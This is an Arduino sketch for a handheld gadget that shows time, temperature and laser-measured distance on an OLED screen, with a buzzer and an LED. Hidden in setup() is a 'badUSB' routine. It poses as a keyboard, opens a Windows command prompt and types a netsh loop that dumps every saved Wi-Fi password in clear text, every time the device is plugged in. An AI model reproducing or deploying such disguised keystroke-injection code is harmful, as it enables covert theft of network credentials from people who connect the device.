#include <Wire.h>
#include <VL53L0X.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH1106.h>
#include <Adafruit_NeoPixel.h>
#include <Keyboard.h>
#include "RTClib.h"
#include <timer.h>

#define BUTTON_UP 10
#define BUTTON_CENTER 9
#define BUTTON_DOWN 8

#define BUZZER 12
#define LASER 13
#define OLED_RESET 7 // not used
#define PIXEL_COUNT 1
#define PIXEL_PIN   6

auto timer = timer_create_default();
Adafruit_SH1106 display(OLED_RESET);
Adafruit_NeoPixel strip = Adafruit_NeoPixel(PIXEL_COUNT, PIXEL_PIN, NEO_GRB + NEO_KHZ800);
VL53L0X sensor;
RTC_DS3231 rtc;
char daysOfTheWeek[7][12] = {"Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"};

boolean button_down_now_state = HIGH;
boolean button_down_old_state = LOW;
boolean laser_state = HIGH;

void setup() {
  badUSB();
  Wire.begin();
  timer.every(9000, keypower);
  
  sensor.init();
  sensor.setTimeout(500);
  sensor.startContinuous();

  pinMode(BUTTON_UP,INPUT_PULLUP);
  pinMode(BUTTON_CENTER,INPUT_PULLUP);
  pinMode(BUTTON_DOWN,INPUT_PULLUP);
  pinMode(BUZZER,OUTPUT);
  pinMode(LASER,OUTPUT);
  pinMode(PIXEL_PIN,OUTPUT);
  
  display.begin(SH1106_SWITCHCAPVCC, 0x3C); 
  display.setTextColor(WHITE);
}

void loop() {
  timer.tick();
  DateTime now = rtc.now();
  display.clearDisplay();
  display.setTextSize(3);
  display.setCursor(0,0);
  display.print(now.hour(), DEC);
  display.print(':');
  display.print(now.minute(), DEC);
  display.setTextSize(1);
  display.print(' ');
  display.print(' ');
  display.print(' ');
  display.print(now.second(), DEC);
  display.println();
  display.setCursor(0,30);
  display.print(now.year(), DEC);
  display.print('/');
  display.print(now.month(), DEC);
  display.print('/');
  display.print(now.day(), DEC);
  display.print(' ');
  display.print(daysOfTheWeek[now.dayOfTheWeek()]);
  display.println();
  display.setCursor(0,40);
  display.print("Temperature: ");
  display.print(rtc.getTemperature());
  display.println(" C");
  display.setCursor(0,50);
  display.print("Distance");
  display.print(':');
  display.print(sensor.readRangeContinuousMillimeters());
  display.println("MM");
  display.display();
  if(digitalRead(BUTTON_UP)==LOW){
    distancedetect();
  }

  button_down_now_state = digitalRead (BUTTON_DOWN);
  if (button_down_old_state == LOW && button_down_now_state == HIGH) {        //if low -> high
      laser_state = !laser_state;                        //switch state: true <-> false
      digitalWrite (LASER, laser_state);
        }
      button_down_old_state = button_down_now_state;       //save button state
}

void BUZZERSOUND()
{
  unsigned char i,j;
  for(i=0;i<5;i++)
  {
     for(i=0;i<200;i++)

    {
      digitalWrite(BUZZER,HIGH);

      delay(1);

      digitalWrite(BUZZER,LOW);

      delay(1);
    }
  }
}
void colorWipe(uint32_t c, uint8_t wait) {
  for(uint16_t i=0; i<strip.numPixels(); i++) {
    strip.setPixelColor(i, c);
    strip.show();
    delay(wait);
  }
}
void badUSB(){
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(50);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);
  //Keyboard.print("netsh wlan show profiles");
  Keyboard.print("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @echo%j | findstr -i -v echo | netsh wlan show profiles %j key=clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();
  delay(500); 
}

void keypower(){
  pinMode(4,OUTPUT);
  digitalWrite(4,LOW);
  delay(500);
  pinMode(4,INPUT);
}
void distancedetect(){
   digitalWrite(LASER,HIGH);
   if((sensor.readRangeContinuousMillimeters()<1000&&sensor.readRangeContinuousMillimeters()>60))
   {
    display.clearDisplay();
    display.setTextSize(5);
    display.setCursor(0,0);
    display.print(sensor.readRangeContinuousMillimeters());
    display.setCursor(0,50);
    display.setTextSize(2);
    display.println("MM");
    display.display();
    colorWipe(strip.Color(255,   0,   0), 50); // Red
    BUZZERSOUND();
   }
 
   else if(sensor.readRangeContinuousMillimeters()>1000)
   {
    display.clearDisplay();
    display.setTextSize(2);
    display.setCursor(0,0);
    display.println("Out of Range!");
    display.setCursor(0,40);
    display.println("0-1200mm");
    display.display();
    colorWipe(strip.Color(  0, 255,   0), 50); // Green
   }
   /*
   else
   {
    //colorWipe(strip.Color(  0,   0, 255), 50); // Blue
    colorWipe(strip.Color(  0,   0,   0), 50);    // Black/off
   }*/
   delay(2000);
   digitalWrite(LASER,LOW);
   colorWipe(strip.Color(  0,   0,   0), 50); 
}
